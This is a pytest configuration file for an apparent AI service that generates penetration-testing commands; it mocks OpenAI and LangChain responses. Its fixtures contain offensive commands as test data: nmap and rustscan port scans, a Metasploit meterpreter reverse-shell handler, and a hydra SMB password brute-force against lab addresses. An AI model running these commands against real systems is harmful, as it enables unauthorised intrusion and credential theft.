"""Test configuration for wish-command-generation-api."""

import json
import os
from unittest.mock import MagicMock, patch

import pytest

# Mock API keys for unit tests
MOCK_OPENAI_API_KEY = "sk-test-key"
MOCK_LANGCHAIN_API_KEY = "ls-test-key"

@pytest.fixture(autouse=True)
def setup_test_env(request):
    """Set up test environment.

    Unit tests and integrated tests: Mock API keys
    Integration tests: Use actual API keys
    """
    # Get test path
    test_path = request.node.fspath.strpath

    # For unit tests and integrated tests
    if "/unit/" in test_path or "/integrated/" in test_path:
        with patch.dict(os.environ, {
            "OPENAI_API_KEY": MOCK_OPENAI_API_KEY,
            "LANGCHAIN_API_KEY": MOCK_LANGCHAIN_API_KEY,
            "LANGCHAIN_TRACING_V2": "false"  # Disable tracing for tests
        }):
            yield
    # For other tests - no mocking, use actual environment variables
    else:
        yield


@pytest.fixture(autouse=True)
def mock_openai_api(monkeypatch, request):
    """Mock OpenAI API calls for unit tests and integrated tests.

    This prevents actual API calls during tests.
    """
    # Get test path
    test_path = request.node.fspath.strpath

    # For unit tests and integrated tests
    if "/unit/" in test_path or "/integrated/" in test_path:
        # モックレスポンスの作成
        mock_response = MagicMock()
        mock_response.choices = [MagicMock()]
        mock_response.choices[0].message.content = json.dumps({
            "command_inputs": [
                {
                    "command": "nmap -Pn -p- 10.10.10.40",
                    "timeout_sec": 60,
                    "strategy": "fast_alternative"
                }
            ]
        })
        
        # model_dump()の戻り値を設定
        mock_model_dump = MagicMock()
        mock_model_dump.get.return_value = None  # error属性を持たないように設定
        mock_response.model_dump.return_value = mock_model_dump
        
        # choices[0].message.model_dump()の戻り値を設定
        mock_message_model_dump = MagicMock()
        mock_message_model_dump.get.return_value = json.dumps({
            "command_inputs": [
                {
                    "command": "nmap -Pn -p- 10.10.10.40",
                    "timeout_sec": 60,
                    "strategy": "fast_alternative"
                }
            ]
        })
        mock_response.choices[0].message.model_dump.return_value = {
            "content": json.dumps({
                "command_inputs": [
                    {
                        "command": "nmap -Pn -p- 10.10.10.40",
                        "timeout_sec": 60,
                        "strategy": "fast_alternative"
                    }
                ]
            })
        }
        
        # generationsの設定
        mock_generation = MagicMock()
        mock_generation.text = json.dumps({
            "command_inputs": [
                {
                    "command": "nmap -Pn -p- 10.10.10.40",
                    "timeout_sec": 60,
                    "strategy": "fast_alternative"
                }
            ]
        })
        mock_generation.content = json.dumps({
            "command_inputs": [
                {
                    "command": "nmap -Pn -p- 10.10.10.40",
                    "timeout_sec": 60,
                    "strategy": "fast_alternative"
                }
            ]
        })
        mock_response.generations = [[mock_generation]]

        # ChatOpenAIのgenerate_promptメソッドをモック
        def mock_generate_prompt(*args, **kwargs):
            mock_chat_result = MagicMock()
            mock_chat_generation = MagicMock()
            mock_chat_generation.message = "nmap -Pn -p- 10.10.10.40"
            mock_chat_generation.text = "nmap -Pn -p- 10.10.10.40"
            mock_chat_generation.content = "nmap -Pn -p- 10.10.10.40"
            mock_chat_result.generations = [[mock_chat_generation]]
            return mock_chat_result

        # OpenAIのcreateメソッドをモック
        with patch("openai.resources.chat.completions.Completions.create", return_value=mock_response):
            with patch("openai.resources.beta.chat.completions.Completions.parse", return_value=mock_response):
                with patch("langchain_core.language_models.chat_models.BaseChatModel.generate_prompt", mock_generate_prompt):
                    # LangSmithのトレーシングもモック
                    with patch("langsmith.run_helpers.traceable", lambda f: f):
                        yield
    else:
        yield


@pytest.fixture
def mock_command_response():
    """Create a mock command response for dialog avoidance."""
    return json.dumps({
        "command": "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; "
                   "set LHOST 10.10.10.1; set LPORT 4444; run; exit -y\""
    })


@pytest.fixture
def mock_list_files_response():
    """Create a mock list files response."""
    return json.dumps({
        "command": "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
                   "-P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt smb://10.10.10.40"
    })


@pytest.fixture
def mock_network_error_response():
    """Create a mock network error response."""
    return json.dumps({
        "command_inputs": [
            {
                "command": "nmap -p- 10.10.10.40",
                "timeout_sec": 60
            }
        ]
    })


@pytest.fixture
def mock_timeout_response():
    """Create a mock timeout response."""
    return json.dumps({
        "command_inputs": [
            {
                "command": "rustscan -a 10.10.10.40",
                "timeout_sec": 60
            }
        ]
    })


@pytest.fixture
def mock_timeout_multiple_response():
    """Create a mock timeout response with multiple commands."""
    return json.dumps({
        "command_inputs": [
            {
                "command": "nmap -p1-32768 10.10.10.40",
                "timeout_sec": 60
            },
            {
                "command": "nmap -p32769-65535 10.10.10.40",
                "timeout_sec": 60
            }
        ]
    })
